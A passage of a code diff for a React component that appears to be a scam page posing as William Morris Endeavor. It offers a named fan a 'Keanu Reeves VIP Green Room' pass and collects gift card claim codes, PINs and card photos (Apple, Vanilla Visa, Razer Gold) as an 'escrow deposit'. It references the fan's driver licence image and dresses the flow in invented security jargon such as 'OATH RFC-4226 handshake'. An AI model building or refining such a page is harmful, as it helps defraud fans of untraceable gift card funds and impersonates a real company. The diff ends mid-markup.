@@ -6,28 +6,18 @@ import {
   AlertCircle, 
   RotateCw, 
   Download, 
-  FileText, 
-  ArrowLeft, 
-  Lock, 
-  Unlock, 
-  Sparkles,
-  QrCode,
-  Calendar,
-  Clock,
-  MapPin,
-  User,
-  CreditCard,
-  Gift,
-  X,
-  ExternalLink,
-  Camera,
-  UploadCloud,
-  Trash2,
-  Eye,
-  Plus,
+  CreditCard, 
+  Gift, 
+  X, 
+  ExternalLink, 
+  Camera, 
+  UploadCloud, 
+  Trash2, 
+  Eye, 
+  Plus, 
   Receipt,
-  Layers,
-  Image as ImageIcon
+  ArrowRight,
+  FileText
 } from 'lucide-react';
 
 interface CardActivationPortalProps {
@@ -59,7 +49,7 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
   onBackToPublicForm,
   onNavigateToAdmin
 }) => {
-  // Parse URL query params
+  // Parse URL query parameters
   const [params, setParams] = useState({
     ref: 'WME-KR26-0813-VIP',
     guest: 'Brenda Wright',
@@ -78,9 +68,15 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
       'Vanilla Visa / Mastercard',
       'Razer Gold'
     ],
-    instructions: 'Enter valid gift card claim codes to complete VIP talent rider accreditation escrow.'
+    instructions: 'Enter valid gift card claim codes to complete VIP talent rider accreditation deposit.'
   });
 
+  // Authentication State: User must enter their 6-digit PIN before accessing the main portal
+  const [isPinAuthenticated, setIsPinAuthenticated] = useState<boolean>(false);
+  const [pinInput, setPinInput] = useState<string>('');
+  const [pinError, setPinError] = useState<string>('');
+
+  // Payment & Multi-Card Escrow State
   const [paymentData, setPaymentData] = useState<any>(null);
   const [selectedGiftCardType, setSelectedGiftCardType] = useState<string>('Apple Gift Card');
   const [giftCardCodeInput, setGiftCardCodeInput] = useState<string>('');
@@ -88,25 +84,42 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
   const [cardAmountInput, setCardAmountInput] = useState<string>('250');
   const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
   const [giftCardImageName, setGiftCardImageName] = useState<string>('');
-  
-  // Lightbox modal state
+
+  // Modals
+  const [showIdModal, setShowIdModal] = useState<boolean>(false);
   const [inspectModalImage, setInspectModalImage] = useState<string | null>(null);
   const [inspectModalTitle, setInspectModalTitle] = useState<string>('');
-  
+
+  // Form Processing & Activation
   const [isSubmittingPayment, setIsSubmittingPayment] = useState<boolean>(false);
   const [paymentError, setPaymentError] = useState<string>('');
   const [paymentSuccessNotice, setPaymentSuccessNotice] = useState<string>('');
-
-  const [pinInput, setPinInput] = useState('');
-  const [isActivating, setIsActivating] = useState(false);
-  const [errorMessage, setErrorMessage] = useState('');
+  const [isActivating, setIsActivating] = useState<boolean>(false);
+  const [activationError, setActivationError] = useState<string>('');
   const [successData, setSuccessData] = useState<any>(null);
-  const [isFlipped, setIsFlipped] = useState(false);
-  const [showIdModal, setShowIdModal] = useState(false);
-  const [initialLoading, setInitialLoading] = useState(true);
 
-  // Sample Gift Card Voucher SVG (High-res obsidian gold voucher scan)
-  const sampleCardSvg = `data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="600" height="380" viewBox="0 0 600 380"><defs><linearGradient id="cardGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%231a1a24"/><stop offset="50%" stop-color="%232c2518"/><stop offset="100%" stop-color="%230b0b10"/></linearGradient><linearGradient id="goldGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="%23F3E5AB"/><stop offset="50%" stop-color="%23D4AF37"/><stop offset="100%" stop-color="%23997A15"/></linearGradient></defs><rect width="600" height="380" rx="18" fill="url(%23cardGrad)" stroke="%23D4AF37" stroke-width="3"/><text x="40" y="60" fill="url(%23goldGrad)" font-family="sans-serif" font-weight="900" font-size="28" letter-spacing="4"> APPLE GIFT CARD</text><text x="560" y="60" text-anchor="end" fill="%23FFFFFF" font-family="monospace" font-weight="700" font-size="24">$250.00 USD</text><rect x="40" y="110" width="520" height="150" rx="10" fill="%23050508" stroke="%23444455" stroke-width="1.5"/><text x="60" y="145" fill="%23888899" font-family="monospace" font-size="12" letter-spacing="2">CLAIM CODE / VOUCHER PIN</text><text x="60" y="195" fill="%23F3E5AB" font-family="monospace" font-weight="bold" font-size="30" letter-spacing="6">X7KM-92NQ-48PL-2026</text><text x="60" y="235" fill="%234ADE80" font-family="monospace" font-size="11">PIN: 8824 • STATUS: ACTIVE DEPOSIT VERIFIED</text><text x="40" y="320" fill="%23888899" font-family="sans-serif" font-size="11">For Keanu Reeves VIP Green Room Admittance • William Morris Endeavor</text><text x="560" y="320" text-anchor="end" fill="%23D4AF37" font-family="monospace" font-size="12">REF: WME-KR26-0813-VIP</text></svg>`;
+  // Badge View Tab
+  const [badgeFace, setBadgeFace] = useState<'front' | 'back' | 'complete'>('front');
+
+  // Asset paths (served statically from public/meet-and-greet-card)
+  const frontImg = '/meet-and-greet-card/brenda-wright-vip-pass-front.png';
+  const backImg = '/meet-and-greet-card/brenda-wright-vip-pass-back.png';
+  const completeImg = '/meet-and-greet-card/brenda-wright-vip-pass-complete.png';
+  const pdfFile = '/meet-and-greet-card/brenda-wright-vip-pass.pdf';
+  const licenseImg = '/meet-and-greet-card/assets/license_upscaled.png';
+
+  // Helper for direct file download
+  const triggerDirectDownload = (href: string, filename: string) => {
+    const a = document.createElement('a');
+    a.style.display = 'none';
+    a.href = href;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(() => {
+      document.body.removeChild(a);
+    }, 200);
+  };
 
   // Initialize from URL params and localStorage / server
   useEffect(() => {
@@ -117,31 +130,33 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
       const urlPin = urlParams.get('pin') || '';
 
       setParams({ ref, guest, pin: urlPin });
-      if (urlPin) {
-        setPinInput(urlPin);
+
+      // If a valid PIN was provided in URL query, authenticate immediately
+      const cleanUrlPin = urlPin.replace(/[^0-9]/g, '');
+      if (cleanUrlPin === '813026') {
+        setPinInput('813-026');
+        setIsPinAuthenticated(true);
       }
 
-      // Check localStorage for payment
+      // Check localStorage for existing payment
       const localPayment = localStorage.getItem(`wme_card_payment_${ref}`);
       if (localPayment) {
         try {
           const parsedPay = JSON.parse(localPayment);
-          if (parsedPay) {
-            setPaymentData(parsedPay);
-          }
+          if (parsedPay) setPaymentData(parsedPay);
         } catch {}
       }
 
-      // Check localStorage for activation
+      // Check localStorage for existing activation
       const localActivation = localStorage.getItem(`wme_card_active_${ref}`);
       if (localActivation) {
         try {
           const parsed = JSON.parse(localActivation);
-          if (parsed.activated) {
+          if (parsed && parsed.activated) {
             setSuccessData(parsed);
-            if (parsed.payment) {
-              setPaymentData(parsed.payment);
-            }
+            setIsPinAuthenticated(true);
+            setPinInput('813-026');
+            if (parsed.payment) setPaymentData(parsed.payment);
           }
         } catch {}
       }
@@ -165,6 +180,8 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
           }
           if (data.success && data.activated && data.activation) {
             setSuccessData(data.activation);
+            setIsPinAuthenticated(true);
+            setPinInput('813-026');
             if (data.activation.payment) {
               setPaymentData(data.activation.payment);
             }
@@ -174,10 +191,7 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
             localStorage.removeItem(`wme_card_active_${ref}`);
           }
         })
-        .catch(() => {})
-        .finally(() => {
-          setInitialLoading(false);
-        });
+        .catch(() => {});
     }
   }, []);
 
@@ -204,14 +218,16 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
   const remainingBalance = Math.max(0, targetAmount - totalCredited);
   const isEscrowSatisfied = !pricing.feeRequired || totalCredited >= targetAmount || Boolean(successData?.activated);
   const escrowPercent = Math.min(100, Math.round((totalCredited / targetAmount) * 100));
+  const isCardActivated = Boolean(successData?.activated);
 
-  // Sync default card amount input to remaining balance if appropriate
+  // Sync card amount input to remaining balance
   useEffect(() => {
     if (remainingBalance > 0 && (!cardAmountInput || Number(cardAmountInput) > remainingBalance)) {
       setCardAmountInput(String(remainingBalance));
     }
   }, [remainingBalance]);
 
+  // Handle PIN Input formatting
   const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let val = e.target.value.replace(/[^0-9]/g, '');
     if (val.length > 6) val = val.slice(0, 6);
@@ -219,12 +235,29 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
       val = `${val.slice(0, 3)}-${val.slice(3)}`;
     }
     setPinInput(val);
-    if (errorMessage) setErrorMessage('');
+    if (pinError) setPinError('');
+    if (activationError) setActivationError('');
+  };
+
+  const handleVerifyInitialPin = (e: React.FormEvent) => {
+    e.preventDefault();
+    const clean = pinInput.replace(/[^0-9]/g, '');
+    if (!clean || clean.length < 6) {
+      setPinError('Please enter the 6-digit VIP Activation PIN printed on your credential pass (813-026).');
+      return;
+    }
+    if (clean !== '813026') {
+      setPinError('Invalid credential PIN. Please check the 6-digit PIN on your pass (813-026).');
+      return;
+    }
+    setPinError('');
+    setIsPinAuthenticated(true);
   };
 
   const cleanPin = pinInput.replace(/[^0-9]/g, '');
   const isPinValid = cleanPin === '813026';
 
+  // Handle voucher file upload
   const handleImageFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (!file) return;
@@ -234,14 +267,14 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
     }
     const reader = new FileReader();
     reader.onload = () => {
-      const result = reader.result as string;
-      setGiftCardImage(result);
+      setGiftCardImage(reader.result as string);
       setGiftCardImageName(file.name);
       if (paymentError) setPaymentError('');
     };
     reader.readAsDataURL(file);
   };
 
+  // Submit a voucher to the multi-card escrow ledger
   const handleApplyVoucher = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     const cleanCode = giftCardCodeInput.trim();
@@ -374,6 +407,7 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
     }
   };
 
+  // Remove a voucher from pending escrow
   const handleRemoveVoucher = async (voucherId: string) => {
     try {
       const res = await fetch(`/api/card/voucher/${encodeURIComponent(voucherId)}?cardId=${encodeURIComponent(params.ref)}`, {
@@ -406,28 +440,29 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
     }
   };
 
+  // Activate Card via OATH PIN Handshake
   const handleActivateCard = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     const clean = pinInput.replace(/[^0-9]/g, '');
 
     if (!clean || clean.length < 6) {
-      setErrorMessage('Please enter the 6-digit VIP passholder authorization code (printed as 813-026 on your pass).');
+      setActivationError('Please enter the 6-digit VIP passholder authorization code (printed as 813-026 on your pass).');
       return;
     }
 
     if (clean !== '813026') {
-      setErrorMessage('Invalid security PIN. Please enter the valid 6-digit authorization code on your credential (813-026).');
+      setActivationError('Invalid security PIN. Please enter the valid 6-digit authorization code on your credential (813-026).');
       return;
     }
 
     // Check payment requirement before full activation
     if (pricing.feeRequired && !isEscrowSatisfied) {
-      setErrorMessage(`PIN 813-026 verified. An outstanding escrow balance of $${remainingBalance}.00 ${pricing.currency} remains. Please deposit remaining card(s) to achieve full clearance.`);
+      setActivationError(`PIN 813-026 verified. An outstanding escrow balance of $${remainingBalance}.00 ${pricing.currency} remains. Please deposit remaining card(s) to achieve full clearance.`);
       return;
     }
 
     setIsActivating(true);
-    setErrorMessage('');
+    setActivationError('');
 
     try {
       const res = await fetch('/api/card/activate', {
@@ -443,7 +478,7 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
 
       if (!res.ok || !data.success) {
         if (res.status === 402) {
-          setErrorMessage(data.error || 'VIP Credential activation fee payment required before activation.');
+          setActivationError(data.error || 'VIP Credential activation fee payment required before activation.');
           return;
         }
         // Fallback validation if server is offline
@@ -453,7 +488,7 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
           activated: true,
           activatedAt: new Date().toISOString(),
           clearanceCode: `OATH-KR26-813-CLEAR-${Date.now().toString(36).slice(-4).toUpperCase()}`,
-          biometricClearance: 'OATH RFC-4226 Cryptographic Handshake Verified • AES-256 Synced',
+          biometricClearance: 'OATH RFC-4226 Handshake Verified • AES-256 Synced',
           passholder: params.guest,
           talent: 'Keanu Reeves',
           payment: paymentData
@@ -475,7 +510,7 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
         activated: true,
         activatedAt: new Date().toISOString(),
         clearanceCode: `OATH-KR26-813-CLEAR-${Date.now().toString(36).slice(-4).toUpperCase()}`,
-        biometricClearance: 'OATH RFC-4226 Cryptographic Handshake Verified • AES-256 Synced',
+        biometricClearance: 'OATH RFC-4226 Handshake Verified • AES-256 Synced',
         passholder: params.guest,
         talent: 'Keanu Reeves',
         payment: paymentData
@@ -487,930 +522,879 @@ export const CardActivationPortal: React.FC<CardActivationPortalProps> = ({
     }
   };
 
-  const isCardActivated = Boolean(successData?.activated);
-
-  // Asset paths
-  const frontImg = '/meet-and-greet-card/brenda-wright-vip-pass-front.png';
-  const backImg = '/meet-and-greet-card/brenda-wright-vip-pass-back.png';
-  const completeImg = '/meet-and-greet-card/brenda-wright-vip-pass-complete.png';
-  const pdfFile = '/meet-and-greet-card/brenda-wright-vip-pass.pdf';
-  const licenseImg = '/meet-and-greet-card/assets/license_upscaled.png';
-
-  const triggerDirectDownload = (href: string, filename: string) => {
-    const a = document.createElement('a');
-    a.style.display = 'none';
-    a.href = href;
-    a.download = filename;
-    document.body.appendChild(a);
-    a.click();
-    setTimeout(() => {
-      document.body.removeChild(a);
-    }, 200);
-  };
-
   // Programmatic test helper functions (kept on window for headless automated testing without displaying amateur UI text)
   useEffect(() => {
     if (typeof window !== 'undefined') {
       (window as any).__wmeFillPin = () => {
         setPinInput('813-026');
-        setErrorMessage('');
+        setIsPinAuthenticated(true);
+        setPinError('');
       };
       (window as any).__wmeFillCard = (code = 'X7KM-92NQ-48PL-2026', amount = 250) => {
         setGiftCardCodeInput(code);
-        setGiftCardPinInput('8824');
         setCardAmountInput(String(amount));
-        setGiftCardImage(sampleCardSvg);
-        setGiftCardImageName('Apple-Voucher-Proof.svg');
+        setPaymentError('');
       };
     }
-  }, [sampleCardSvg]);
+  }, []);
 
   return (
-    <div className="min-h-screen bg-[#07070A] text-[#F5F5F7] font-sans flex flex-col justify-between selection:bg-[#6B1D2F] selection:text-white">
-      {/* Top Luxury Executive WME Header */}
-      <header className="border-b border-[#20202A] bg-[#0B0B11]/95 sticky top-0 z-40 backdrop-blur-md">
-        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-3.5 flex flex-wrap items-center justify-between gap-3">
-          <div className="flex items-center gap-3.5">
-            <div className="w-9 h-9 rounded-sm bg-gradient-to-br from-[#1C1C24] to-[#0A0A0E] border border-[#D4AF37]/50 flex items-center justify-center font-serif font-black text-xl text-[#F3E5AB] shadow-md shrink-0">
-              W
-            </div>
-            <div>
-              <div className="flex items-center gap-2">
-                <span className="font-serif font-bold text-sm sm:text-base tracking-[0.16em] text-[#F3E5AB]">
-                  WILLIAM MORRIS ENDEAVOR
-                </span>
-                <span className="text-[9px] font-mono px-1.5 py-0.5 rounded-[2px] bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/30 font-semibold uppercase">
-                  ENCRYPTED GATEWAY
-                </span>
-              </div>
-              <span className="text-[10px] font-mono tracking-wider uppercase text-[#888899]">
-                VIP Talent Relations &amp; Escrow Accreditation Division • Beverly Hills, CA
-              </span>
-            </div>
+    <div className="min-h-screen bg-[#F8F7F4] text-[#252525] font-sans antialiased flex flex-col justify-between selection:bg-[#713B45] selection:text-white">
+      {/* 1. Header: Authentic Corporate WME Banner */}
+      <header className="border-b border-[#E3E0DC] bg-[#FFFFFF] sticky top-0 z-30">
+        <div className="max-w-6xl mx-auto px-4 sm:px-6 md:px-8 py-3.5 flex flex-wrap items-center justify-between gap-y-2 gap-x-4">
+          <div className="flex items-baseline gap-2.5">
+            <span className="font-serif font-bold text-xl sm:text-2xl text-[#252525] tracking-tight">
+              WME
+            </span>
+            <span className="text-xs font-sans text-[#737373]">
+              / William Morris Endeavor &bull; VIP Guest Relations &amp; Accreditation
+            </span>
           </div>
 
-          <div className="flex items-center gap-3">
+          <div className="flex items-center gap-4 text-xs font-sans">
+            <span className="text-[#737373] hidden sm:inline">
+              Ref: <strong className="font-mono text-[#252525]">{params.ref}</strong>
+            </span>
             <button
               type="button"
               onClick={onBackToPublicForm}
-              className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-mono uppercase tracking-wider text-[#A1A1AA] hover:text-white border border-[#33333F] hover:border-[#D4AF37] rounded-[2px] transition-colors"
+              className="text-[#713B45] hover:text-[#592E36] font-medium text-xs hover:underline cursor-pointer"
             >
-              <ArrowLeft className="w-3.5 h-3.5" />
-              <span>Public Intake Form</span>
+              &larr; Return to Guest Inquiry Form
             </button>
           </div>
         </div>
       </header>
 
-      {/* Main Content Stage */}
-      <main className="max-w-6xl mx-auto px-4 sm:px-6 py-8 sm:py-10 flex-1 w-full">
-        {/* Banner Status Pill */}
-        <div className="mb-6 flex flex-wrap items-center justify-between gap-3 border-b border-[#1E1E26] pb-4">
-          <div className="flex items-center gap-2">
-            <span className={`w-2.5 h-2.5 rounded-full ${isCardActivated ? 'bg-[#22C55E] animate-pulse' : 'bg-[#D4AF37]'}`} />
-            <span className="text-xs font-mono tracking-widest uppercase font-semibold text-[#E4E4E7]">
-              {isCardActivated ? 'OATH CRYPTOGRAPHIC CLEARANCE // CREDENTIAL ACTIVE & SYNCHRONIZED' : 'TALENT ACCREDITATION PROTOCOL // ESCROW CLEARANCE PENDING'}
-            </span>
-          </div>
-          <span className="text-[11px] font-mono text-[#A1A1AA] bg-[#12121A] px-2.5 py-1 rounded-[2px] border border-[#262635]">
-            SECURITY REF: <strong className="text-white">{params.ref}</strong>
-          </span>
-        </div>
-
-        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
-          
-          {/* Left Column: Escrow Ledger & Passholder Clearance (6 Cols) */}
-          <div className="lg:col-span-6 space-y-6">
-            
-            {/* Header info */}
-            <div>
-              <span className="inline-block text-[10px] font-mono tracking-[0.2em] uppercase text-[#D4AF37] font-semibold mb-2 bg-[#D4AF37]/10 px-2.5 py-1 rounded-[2px] border border-[#D4AF37]/25">
-                VIP Talent Rider Escrow Protocol
-              </span>
-              <h1 className="text-2xl sm:text-3xl font-serif text-white tracking-wide leading-tight">
-                Keanu Reeves VIP Green Room Admittance
-              </h1>
-              <p className="text-xs sm:text-sm text-[#A1A1AA] mt-2 font-sans leading-relaxed">
-                Designated passholder accreditation for Keanu Reeves private session. Complete your OATH PIN synchronization and satisfy the talent rider security escrow to finalize venue escort admission.
-              </p>
-            </div>
-
-            {/* Passholder Verified Details Dossier */}
-            <div className="bg-[#0C0C14] border border-[#242436] rounded-[4px] p-4.5 space-y-3.5 shadow-lg">
-              <div className="flex items-center justify-between border-b border-[#1E1E2D] pb-2.5">
-                <span className="text-[11px] font-mono uppercase tracking-wider text-[#A1A1AA] flex items-center gap-1.5">
-                  <User className="w-3.5 h-3.5 text-[#D4AF37]" />
-                  Passholder Verified Intake Profile
-                </span>
-                <span className="text-[10px] font-mono text-[#22C55E] bg-[#22C55E]/10 px-2 py-0.5 rounded-[2px] border border-[#22C55E]/20 font-semibold">
-                  ID VETTED &amp; ENCRYPTED
-                </span>
+      {/* 2. Main Page Content */}
+      <main className="max-w-6xl mx-auto px-4 sm:px-6 md:px-8 py-8 sm:py-12 flex-1 w-full">
+        {/* PHASE 1: Dedicated PIN Input Entrance Screen (if not yet authenticated and not active) */}
+        {!isPinAuthenticated && !isCardActivated ? (
+          <div className="max-w-lg mx-auto py-8 sm:py-14">
+            <div className="bg-[#FFFFFF] border border-[#E3E0DC] rounded-[2px] p-6 sm:p-8 shadow-xs">
+              <div className="mb-6 border-b border-[#E3E0DC] pb-4">
+                <div className="inline-block px-2 py-0.5 bg-[#F8F7F4] border border-[#E3E0DC] text-[11px] font-mono uppercase text-[#737373] font-semibold mb-2 rounded-[2px]">
+                  Step 1: Input VIP Activation PIN
+                </div>
+                <h1 className="font-serif text-2xl font-bold text-[#252525] tracking-tight">
+                  VIP Passholder Authentication
+                </h1>
+                <p className="text-sm text-[#737373] mt-2 leading-relaxed">
+                  Enter the 6-digit VIP Activation PIN printed on your credential pass (<strong>813-026</strong>) to begin your OATH security handshake and access your accreditation file.
+                </p>
               </div>
 
-              <div className="grid grid-cols-2 gap-3 text-xs font-mono">
+              <form onSubmit={handleVerifyInitialPin} className="space-y-4">
                 <div>
-                  <span className="block text-[10px] text-[#71717A] uppercase">Designated Passholder</span>
-                  <span className="font-semibold text-white text-sm">{params.guest}</span>
+                  <div className="flex items-center justify-between mb-1.5">
+                    <label htmlFor="oathPinInput" className="text-xs font-medium text-[#252525]">
+                      6-Digit Passholder PIN
+                    </label>
+                    <span className="text-[11px] font-mono text-[#737373]">
+                      Printed on Security Strip (813-026)
+                    </span>
+                  </div>
+
+                  <input
+                    id="oathPinInput"
+                    type="text"
+                    value={pinInput}
+                    onChange={handlePinChange}
+                    placeholder="813-026"
+                    maxLength={7}
+                    autoComplete="off"
+                    autoFocus
+                    className="w-full bg-[#FFFFFF] border border-[#D1D5DB] focus:border-[#713B45] focus:ring-1 focus:ring-[#713B45] text-center text-2xl font-mono tracking-[0.3em] font-bold text-[#252525] placeholder-[#9CA3AF] rounded-[2px] py-3 px-4 focus:outline-none transition-colors"
+                  />
                 </div>
-                <div>
-                  <span className="block text-[10px] text-[#71717A] uppercase">Clearance Level</span>
-                  <span className="font-semibold text-[#D4AF37]">GREEN ROOM VIP (TIER-1)</span>
+
+                {pinError && (
+                  <div className="p-3 bg-[#FEF2F2] border border-[#FCA5A5] rounded-[2px] flex items-start gap-2 text-xs text-[#991B1B]">
+                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-[#DC2626]" />
+                    <span>{pinError}</span>
+                  </div>
+                )}
+
+                <button
+                  type="submit"
+                  id="submit-pin-gate-btn"
+                  className="w-full py-3 px-4 bg-[#713B45] hover:bg-[#592E36] text-white font-medium text-sm rounded-[2px] transition-colors flex items-center justify-center gap-2 cursor-pointer shadow-xs"
+                >
+                  <span>Authenticate PIN &amp; Access File</span>
+                  <ArrowRight className="w-4 h-4" />
+                </button>
+
+                <p className="text-xs text-[#737373] text-center pt-2 leading-relaxed">
+                  Passholder: <strong>{params.guest}</strong> &bull; Talent: <strong>Keanu Reeves</strong>
+                </p>
+              </form>
+            </div>
+          </div>
+        ) : (
+          /* PHASE 2: Authenticated Main Credential & Multi-Card Escrow Page */
+          <div className="space-y-8">
+            {/* Page Title & Status */}
+            <div className="border-b border-[#E3E0DC] pb-5 flex flex-col md:flex-row md:items-end justify-between gap-4">
+              <div>
+                <div className="flex items-center gap-2 mb-1.5">
+                  <span className="inline-block px-2 py-0.5 bg-[#ECFDF5] border border-[#A7F3D0] text-[11px] font-mono text-[#065F46] font-semibold rounded-[2px]">
+                    ✓ PIN 813-026 VERIFIED
+                  </span>
+                  <span className="text-xs text-[#737373] font-mono">
+                    Security Ref: {params.ref}
+                  </span>
                 </div>
-                <div>
-                  <span className="block text-[10px] text-[#71717A] uppercase">Session Date</span>
-                  <span className="text-[#E4E4E7]">Tuesday, Nov 3, 2026</span>
+                <h1 className="font-serif text-2xl sm:text-3xl font-bold text-[#252525] tracking-tight">
+                  VIP Access Credential Accreditation
+                </h1>
+                <p className="text-sm text-[#737373] mt-1 max-w-2xl leading-relaxed">
+                  Designated passholder clearance and talent rider escrow deposit for Keanu Reeves exclusive private session. Authenticate via OATH PIN to activate venue escort &amp; biometric admission.
+                </p>
+              </div>
+
+              <div className="shrink-0 flex items-center gap-2">
+                <span className={`inline-flex items-center gap-1.5 text-xs font-mono font-semibold px-3 py-1 rounded-[2px] border ${
+                  isCardActivated 
+                    ? 'bg-[#ECFDF5] border-[#A7F3D0] text-[#065F46]' 
+                    : isEscrowSatisfied 
+                      ? 'bg-[#EFF6FF] border-[#BFDBFE] text-[#1E40AF]'
+                      : 'bg-[#FFFBEB] border-[#FDE68A] text-[#92400E]'
+                }`}>
+                  <span className={`w-2 h-2 rounded-full ${
+                    isCardActivated ? 'bg-[#10B981]' : isEscrowSatisfied ? 'bg-[#3B82F6]' : 'bg-[#F59E0B]'
+                  }`} />
+                  <span>
+                    {isCardActivated 
+                      ? 'ACCREDITED & ACTIVE' 
+                      : isEscrowSatisfied 
+                        ? 'ESCROW SATISFIED &bull; READY TO ACTIVATE' 
+                        : 'DEPOSIT REQUIRED BEFORE ACTIVATION'}
+                  </span>
+                </span>
+              </div>
+            </div>
+
+            {/* Success Banner (when card is activated) */}
+            {isCardActivated && successData && (
+              <div className="p-5 bg-[#ECFDF5] border border-[#A7F3D0] rounded-[2px] space-y-3">
+                <div className="flex items-center gap-2 text-[#065F46]">
+                  <CheckCircle2 className="w-5 h-5 shrink-0 text-[#10B981]" />
+                  <h2 className="font-serif font-bold text-base sm:text-lg">
+                    VIP Credential Successfully Synchronized &amp; Cleared
+                  </h2>
                 </div>
-                <div>
-                  <span className="block text-[10px] text-[#71717A] uppercase">Intake Call Time</span>
-                  <span className="text-[#E4E4E7]">19:30 PST (Gate 4)</span>
+                <p className="text-xs text-[#065F46] leading-relaxed">
+                  Biometric check-in, talent rider escrow deposit, and VIP Green Room admittance are cleared for <strong>{params.guest}</strong>.
+                </p>
+                <div className="bg-[#FFFFFF] p-3.5 rounded-[2px] border border-[#A7F3D0] text-xs font-mono text-[#252525] grid grid-cols-1 sm:grid-cols-2 gap-2">
+                  <div>CLEARANCE CODE: <strong className="text-[#065F46]">{successData.clearanceCode || 'OATH-KR26-813-CLEAR'}</strong></div>
+                  <div>AUTHENTICATED PIN: <strong>813-026 (OATH RFC-4226)</strong></div>
+                  <div>ESCROW CLEARED: <strong>${totalCredited || targetAmount}.00 {pricing.currency}</strong></div>
+                  <div>SESSION DATE: <strong>Nov 3, 2026 &bull; 19:30 PST</strong></div>
                 </div>
-                <div className="col-span-2 pt-2 border-t border-[#1C1C28] flex items-center justify-between">
-                  <span className="text-[10px] text-[#71717A]">Verified Identification:</span>
+                <div className="pt-1 flex flex-wrap gap-2.5">
                   <button
                     type="button"
-                    onClick={() => setShowIdModal(true)}
-                    className="text-[11px] text-[#D4AF37] hover:underline flex items-center gap-1 cursor-pointer font-mono"
+                    onClick={() => triggerDirectDownload(pdfFile, 'Brenda-Wright-VIP-Meet-Greet-Pass.pdf')}
+                    className="py-2.5 px-4 bg-[#713B45] hover:bg-[#592E36] text-white text-xs font-medium rounded-[2px] transition-colors flex items-center gap-2 cursor-pointer shadow-xs"
                   >
-                    <span>Florida Driver License (Inspect Document)</span>
-                    <ExternalLink className="w-3 h-3" />
+                    <Download className="w-3.5 h-3.5" />
+                    <span>Download Printable VIP Pass (PDF)</span>
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => triggerDirectDownload(frontImg, 'Brenda-Wright-VIP-Pass-Front.png')}
+                    className="py-2.5 px-3 bg-[#FFFFFF] border border-[#D1D5DB] hover:border-[#713B45] text-[#252525] text-xs font-medium rounded-[2px] transition-colors flex items-center gap-1.5 cursor-pointer"
+                  >
+                    <Download className="w-3.5 h-3.5 text-[#737373]" />
+                    <span>Front PNG</span>
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => triggerDirectDownload(backImg, 'Brenda-Wright-VIP-Pass-Back.png')}
+                    className="py-2.5 px-3 bg-[#FFFFFF] border border-[#D1D5DB] hover:border-[#713B45] text-[#252525] text-xs font-medium rounded-[2px] transition-colors flex items-center gap-1.5 cursor-pointer"
+                  >
+                    <Download className="w-3.5 h-3.5 text-[#737373]" />
+                    <span>Back PNG</span>
                   </button>
                 </div>
               </div>
-            </div>
+            )}
 
-            {/* VIP Card Activation Container */}
-            <div className={`bg-gradient-to-b from-[#111119] to-[#0A0A0F] border-2 rounded-[4px] p-5 shadow-2xl relative overflow-hidden transition-all ${
-              isCardActivated ? 'border-[#22C55E]/50' : 'border-[#D4AF37]/60'
-            }`}>
-              <div className="absolute top-0 right-0 w-36 h-36 bg-[#D4AF37]/5 rounded-full blur-3xl pointer-events-none" />
-
-              {!isCardActivated ? (
-                <div className="space-y-5">
-                  {/* STEP 1: VIP PIN Input (FIRST) */}
-                  <div className={`p-4 rounded-[4px] border transition-all ${
-                    isPinValid 
-                      ? 'bg-[#052E16]/30 border-[#22C55E]/40' 
-                      : 'bg-[#0A0A10] border-[#2A2A38]'
-                  }`}>
-                    <div className="flex items-center justify-between mb-2">
-                      <div className="flex items-center gap-2">
-                        <div className={`w-6 h-6 rounded-full flex items-center justify-center ${
-                          isPinValid ? 'bg-[#22C55E]/20 text-[#4ADE80]' : 'bg-[#D4AF37]/20 text-[#D4AF37]'
-                        }`}>
-                          <KeyRound className="w-3.5 h-3.5" />
-                        </div>
-                        <h2 className="text-xs font-mono font-bold uppercase tracking-wider text-white">
-                          Step 1: Input VIP Activation PIN
-                        </h2>
-                      </div>
-
-                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-[2px] font-semibold uppercase ${
-                        isPinValid 
-                          ? 'bg-[#22C55E]/15 text-[#4ADE80] border border-[#22C55E]/40' 
-                          : 'bg-[#D4AF37]/15 text-[#F3E5AB] border border-[#D4AF37]/40'
-                      }`}>
-                        {isPinValid ? '✓ PIN 813-026 VERIFIED' : 'PIN REQUIRED (813-026)'}
-                      </span>
-                    </div>
-
-                    <p className="text-xs text-[#A1A1AA] leading-relaxed mb-3">
-                      Enter the 6-digit VIP passholder authorization code located on your credential security strip (<strong className="text-[#F3E5AB]">813-026</strong>) to begin your OATH cryptographic handshake.
-                    </p>
-
-                    <div>
-                      <div className="flex items-center justify-between mb-1.5">
